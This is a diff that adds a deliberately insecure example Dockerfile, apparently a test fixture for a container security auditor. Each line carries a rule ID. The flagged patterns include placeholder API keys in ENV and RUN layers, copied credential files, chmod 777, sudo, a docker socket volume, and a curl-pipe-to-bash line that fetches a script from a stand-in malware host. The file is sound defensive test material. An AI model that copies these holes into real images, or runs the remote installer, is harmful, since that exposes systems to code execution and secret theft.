@@ -1,0 +1,38 @@
+# examples/Dockerfile.vulnerable -- intentionally insecure.
+# Every pattern here maps to a real incident class; see README.md.
+# Expected audit: BLOCK (score well over 50).
+
+FROM python:latest
+
+# DS-003: secret material baked into an ENV layer
+ENV OPENAI_API_KEY=sk-0123456789abcdef0123
+ENV GITHUB_TOKEN="ghp_0123456789abcdef0123456789abcdef0123"
+
+WORKDIR /app
+
+# DS-009: credential file copied into the image
+COPY server.key /app/server.key
+COPY .env /app/.env
+
+# DS-005: pipe-to-shell installer, DS-013: apt lists left behind
+RUN apt-get update && apt-get install -y curl \
+    && curl -sSL https://get.example-malware.example | bash
+
+# DS-004: raw secret material in a RUN command
+RUN echo "AWS_ACCESS_KEY_ID=AKIA0123456789ABCDEF" > /root/.aws-env
+
+# DS-012: world-writable app dir
+RUN chmod -R 777 /app
+
+# DS-011: sudo inside a build
+RUN sudo cp config.yaml /etc/config.yaml
+
+# DS-010: host docker socket into the container
+VOLUME /var/run/docker.sock
+
+# DS-007: ADD for a plain local file
+ADD app.py /app/app.py
+
+# no USER (DS-006), no HEALTHCHECK despite EXPOSE (DS-014)
+EXPOSE 8000
+CMD ["python", "/app/app.py"]
